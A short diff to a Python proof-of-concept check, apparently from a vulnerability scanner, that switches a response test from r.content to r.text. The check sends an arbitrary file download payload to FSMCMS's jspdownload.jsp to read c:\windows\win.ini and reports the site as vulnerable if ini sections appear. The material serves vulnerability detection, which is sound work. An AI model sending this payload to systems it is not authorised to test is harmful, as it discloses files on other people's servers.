@@ -49,7 +49,7 @@ class Poc(ABPoc):
             # http://www.wooyun.org/bugs/wooyun-2010-0116270
             payload = '/fsmcms/cms/web/jspdownload.jsp?FileUrl=c:%5Cwindows%5Cwin.ini'
             r = requests.get(self.target + payload)
-            if r.status_code == 200 and '[fonts]' in r.content and '[extensions]' in r.content and '[files]' in r.content:
+            if r.status_code == 200 and '[fonts]' in r.text and '[extensions]' in r.text and '[files]' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
